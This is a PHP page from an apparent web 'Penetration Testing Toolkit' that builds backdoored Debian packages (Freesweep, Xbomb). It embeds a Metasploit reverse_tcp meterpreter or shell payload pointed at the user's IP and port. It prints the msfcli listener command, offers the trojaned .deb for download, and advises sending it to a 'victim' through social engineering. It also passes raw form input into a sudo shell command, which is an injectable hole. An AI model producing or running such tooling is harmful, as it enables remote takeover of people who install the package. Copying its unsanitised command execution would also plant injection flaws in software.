<?php /***************************************************************************
 Copyright (C) 2014 Rakesh Pandey
 Written by Rakesh Pandey <rakeshpandey@karunya.edu.in>.
 
 This file is part of Penetration Testing Toolkit, a web interface for various ethical hacking tools.
 
 Penetration Testing Toolkit is free software; you can redistribute it and/or modify it 
 under the terms of the GNU General Public License as published by the Free
 Software Foundation; either version 2 of the License, or (at your option)
 any later version. 

 Penetration Testing Toolkit is distributed in the hope that it will be useful, but WITHOUT 
 ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or 
 FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for 
 more details.

 You should have received a copy of the GNU General Public License along
 with Penetration Testing Toolkit; if not, write to the Free Software Foundation, Inc.,
 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA.
***************************************************************************/?>
<?php
require_once 'layout.php';
require_once 'u.php';
?>

<section id="main" class="column">
		
		<h4 class="alert_info">Welcome to the Web Based Penetration Testing Toolkit.</h4>
	<div class="clear"></div>
		
		<article class="module width_full">
			<header><h3>Backdooring Debian Pakage</h3></header>
				<div class="module_content">
                                    <form name="form1" action="deb.php" method="post" enctype="multipart/form-data">
						<fieldset>
							<label>Enter Your IP Address</label>
                                                        <input type="text" name="ip" value="" >
						</fieldset>
    <fieldset>
							<label>Enter Port to Use</label>
                                                        <input type="text" name="port" value="4444" >
                                                        </fieldset>
                                        <fieldset>
							<label>Enter Your Username</label>
                                                        <input type="text" name="uname" value="root" >
                                                        </fieldset>
    
     <fieldset>
        <label>Choose a debian package </label><br/>     
        <p><input type="radio" value="p1" name="p" checked="true"> Freesweep(x86) </p>
 <p><input  type="radio" value="p2" name="p" >Xbomb(x86_64) </p>
    </fieldset>	
   <fieldset>
        <label>Linux Payload</label><label style="float:right;margin-right: 2%">Description</label><br/>     
        <p><input type="radio" value="linux/x86/meterpreter/reverse_tcp" name="c" checked="true">  Linux x86 Meterpreter Reverse Tcp	 <v style=" float: right;margin-right:  4%"> Connect back to the attacker, Staged meterpreter server</v> </p>
   <p><input  type="radio" value="linux/x86/shell_reverse_tcp" name="c" > Linux x86 shell reverse_tcp<v style=" float: right;margin-right:  4%"> Connect back to the attacker, Spawn a command shell</v> </p>
    </fieldset>				
		
						<div class="clear"></div>
				</div>
			<footer>
				<div class="submit_link">
					
                                    <input type="submit" name="submit" value="Start Now" class="alt_btn" id="submit">
                                    <input type="reset" value="Reset" id="reset"></a>
				</div>
			</footer>
</form>
		</article><!-- end of post new article -->
                 <?php
               
                if(isset($_POST['submit']))
                {
                    $ip=$_POST['ip'];
                    $port=$_POST['port'];
                    $p=$_POST['p'];
                     $uname=$_POST['uname'];
                     $c=$_POST['c'];
      if($ip==''||$port==''){
                   
                   echo "<script type='text/javascript'>$.msg({fadeIn : 500,fadeOut : 500,bgPath : 'dlgs/',  content : 'You Have not entered datas correctly...'});</script>";
             
                   }else{
                       
                   
                 require_once 'loading.php';
                 echo "<fieldset>";
                 switch($p){
                     case p1:
                         $sh="freesweep.sh";
                         $pkg="freesweep.deb";
                         shell("sudo sh cmd/debian/$sh $c $ip $port $uname");
                         break;
                     case p2:
                         $sh="xbomb.sh";
                         $pkg="xbomb.deb";
                         shell("sudo sh cmd/debian/$sh $c $ip $port $uname");
                         break;
                 }
               
                 
                          
      echo '<p><b>Payload Configuration</b></p>';
echo'****************************************************************************';
echo '<p><b>LHOST</b>                     -->'.$ip.'</p>';
echo '<p><b>LPORT</b>                     -->'.$port.'</p>';
echo '<p><b>PACKAGE NAME</b>              -->'.$pkg.'</p>';
echo '<p><b>PAYLOAD</b>                   -->'.$c.'</p>';
echo '<p><b>AVAILABLE FOR DOWNLOAD @</b>  --><a href=exploits/'.$pkg.'>Click here</a>';
echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Debian Based Linux Distributions</p>';
echo'<p>*****************************************************************************</p>';
echo '<b>Note:</b>You can send this package to victim by any social engineering techniques  ';


echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
echo 'sudo msfcli exploit/multi/handler PAYLOAD='.$c.'  LHOST='.$ip.' LPORT='.$port.' E'; 

$host=$_SERVER['SERVER_ADDR'];
	        echo "<p>To Open Terminal Click <a target='_blank' href='https://$host:4200/'>here</a></p>";

         echo '</div>
                                    <footer>
				<div align="left">
					
					<h3>Thank You!</h3>
                                        
				</div>
			</footer>
		</article><!-- end of styles article -->
                 <h4 class="alert_success">Succeeded </h4>
                 
 ';
         
 }       
                }                
    
        ?>
  		<div class="spacer"></div>
	</section>
</body>
</html>
